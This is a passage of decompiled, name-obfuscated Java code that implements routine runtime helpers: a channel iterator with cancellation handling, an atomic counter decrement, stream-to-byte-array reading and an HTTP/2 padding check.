            objW9sT1Swbhx3hs = oQ5dNvIVkA1dcss1.w9sT1Swbhx3hs(sejrikqlytpnd8x6xei);
            if (objW9sT1Swbhx3hs == pjn1l01kdmwnpcy0dad) {
                OQ5dNvIVkA1dcss1 oQ5dNvIVkA1dcss4 = oQ5dNvIVkA1dcss1;
                urJN9H1OU7p7Jp2 = urJN9H1OU7p7Jp;
                oQ5dNvIVkA1dcss2 = oQ5dNvIVkA1dcss4;
                guw52pktgwkb0kb = guw52pktgwkb0kb2;
                if (!((Boolean) objW9sT1Swbhx3hs).booleanValue()) {
                    if (z) {
                        guw52pktgwkb0kb.vekpFI4d1Nc4fakF(null);
                    }
                    return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                }
                obj = oQ5dNvIVkA1dcss2.w9sT1Swbhx3hs;
                o0rn3ekjbj6kkwok = LYgmvfM6ccmccA0DV.nQilHWaqS401ZtR;
                if (obj == o0rn3ekjbj6kkwok) {
                    throw new IllegalStateException("`hasNext()` has not been invoked");
                }
                oQ5dNvIVkA1dcss2.w9sT1Swbhx3hs = o0rn3ekjbj6kkwok;
                if (obj == LYgmvfM6ccmccA0DV.gmNWMfvn6zlEj) {
                    thQrz92kRPw4GcghAc = oQ5dNvIVkA1dcss2.JXn4Qf7zpnLjP5.Qrz92kRPw4GcghAc();
                    if (thQrz92kRPw4GcghAc == null) {
                        thQrz92kRPw4GcghAc = new GF2XQtecfzOat6RtF("Channel was closed");
                    }
                    int i5 = mofFoMhrcahJuf2MKa0Q.dDIMxZXP1V8HdM;
                    throw thQrz92kRPw4GcghAc;
                }
                sejrikqlytpnd8x6xei.Ee8d2j4S9Vm5yGuR = urJN9H1OU7p7Jp2;
                sejrikqlytpnd8x6xei.xDyLpEZyrcKVe0 = guw52pktgwkb0kb;
                sejrikqlytpnd8x6xei.ibVTtJUNfrGYbW = oQ5dNvIVkA1dcss2;
                sejrikqlytpnd8x6xei.b1EoSIRjJHO5 = z;
                sejrikqlytpnd8x6xei.D5P1xCAyuvgF = 2;
            }
            guw52pktgwkb0kb3 = guw52pktgwkb0kb;
            return pjn1l01kdmwnpcy0dad;
        } catch (Throwable th) {
            try {
                throw th;
            } catch (Throwable th2) {
                if (z) {
                    CancellationException cancellationException = th instanceof CancellationException ? th : null;
                    if (cancellationException == null) {
                        cancellationException = new CancellationException("Channel was consumed, consumer had failed");
                        cancellationException.initCause(th);
                    }
                    r5WF639wwoyEjivV7M7.vekpFI4d1Nc4fakF(cancellationException);
                }
                throw th2;
            }
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r3v1, types: [boolean, int] */
    public static boolean rCHnHJBAlOpNI5(ZZ4JSe5sYVMN33b7 zZ4JSe5sYVMN33b7) {
        AtomicIntegerFieldUpdater atomicIntegerFieldUpdater;
        int i;
        lTvXDdEqiCIXojiLB ltvxddeqicixojilb = (lTvXDdEqiCIXojiLB) zZ4JSe5sYVMN33b7;
        ltvxddeqicixojilb.getClass();
        AtomicReferenceFieldUpdater atomicReferenceFieldUpdater = lTvXDdEqiCIXojiLB.Ee8d2j4S9Vm5yGuR;
        while (true) {
            AtomicIntegerFieldUpdater atomicIntegerFieldUpdater2 = Xmmn1A4TQOiVOB.JXn4Qf7zpnLjP5;
            int i2 = atomicIntegerFieldUpdater2.get(ltvxddeqicixojilb);
            ?? r3 = 84 - 83;
            if (i2 > r3) {
                do {
                    atomicIntegerFieldUpdater = Xmmn1A4TQOiVOB.JXn4Qf7zpnLjP5;
                    i = atomicIntegerFieldUpdater.get(ltvxddeqicixojilb);
                    if (i <= r3) {
                        break;
                    }
                } while (!atomicIntegerFieldUpdater.compareAndSet(ltvxddeqicixojilb, i, r3));
            } else {
                if (i2 <= 0) {
                    return false;
                }
                if (atomicIntegerFieldUpdater2.compareAndSet(ltvxddeqicixojilb, i2, i2 - 1)) {
                    atomicReferenceFieldUpdater.set(ltvxddeqicixojilb, null);
                    return r3;
                }
            }
        }
    }

    public static byte[] vIJudZvPyTuNp(PrS03qKEj0Ie7QXX9 prS03qKEj0Ie7QXX9) throws IOException {
        ArrayDeque arrayDeque = new ArrayDeque((-5) + 25);
        int iMin = Math.min(8262 - 70, Math.max(78 + 50, Integer.highestOneBit(0) * 2));
        int i = 0;
        while (i < 2147483639) {
            int iMin2 = Math.min(iMin, 2147483639 - i);
            byte[] bArr = new byte[iMin2];
            arrayDeque.add(bArr);
            int i2 = 0;
            while (i2 < iMin2) {
                int i3 = prS03qKEj0Ie7QXX9.read(bArr, i2, iMin2 - i2);
                if (i3 == -1) {
                    return ibVTtJUNfrGYbW(arrayDeque, i);
                }
                i2 += i3;
                i += i3;
            }
            long j = ((long) iMin) * ((long) (iMin < 4096 ? 4 : 2));
            if (j > 2147483647L) {
                iMin = Integer.MAX_VALUE;
            } else {
                iMin = j < -2147483648L ? Integer.MIN_VALUE : (int) j;
            }
        }
        if (prS03qKEj0Ie7QXX9.read() == -1) {
            return ibVTtJUNfrGYbW(arrayDeque, 2147483639);
        }
        throw new OutOfMemoryError("input is too large to fit in a byte array");
    }

    public static int wotphlvK9sPbXJ(int i, int i2, int i3) throws IOException {
        if ((i2 & 8) != 0) {
            i--;
        }
        if (i3 <= i) {
            return i - i3;
        }
        throw new IOException(Y9mRyRdkl5FOcwb66V6.Ee8d2j4S9Vm5yGuR(i3, i, "PROTOCOL_ERROR padding ", " > remaining length "));
    }

    public static void xDyLpEZyrcKVe0(HT6Px2xDdrmDEbykyYy hT6Px2xDdrmDEbykyYy) {
        hT6Px2xDdrmDEbykyYy.ibVTtJUNfrGYbW(null, false);
    }

    public static int yTljMGnIibTRdOpSh4(String str, int i, int i2) {
        return (int) EWUjsTERgdPbSw3NNlN(str, i, 1, (i2 & 8) != 0 ? Integer.MAX_VALUE : 2097150);
    }

    public abstract void H9XlUr4OeMJFiXK(wotphlvK9sPbXJ wotphlvk9spbxj, Thread thread);

    public abstract boolean JXn4Qf7zpnLjP5(Qrz92kRPw4GcghAc qrz92kRPw4GcghAc, wotphlvK9sPbXJ wotphlvk9spbxj, wotphlvK9sPbXJ wotphlvk9spbxj2);

    public abstract void XiR1pIn5878vVWd(wotphlvK9sPbXJ wotphlvk9spbxj, wotphlvK9sPbXJ wotphlvk9spbxj2);

    public abstract boolean vekpFI4d1Nc4fakF(Qrz92kRPw4GcghAc qrz92kRPw4GcghAc, Object obj, Object obj2);

    public abstract boolean w9sT1Swbhx3hs(Qrz92kRPw4GcghAc qrz92kRPw4GcghAc, D5P1xCAyuvgF d5P1xCAyuvgF, D5P1xCAyuvgF d5P1xCAyuvgF2);
}
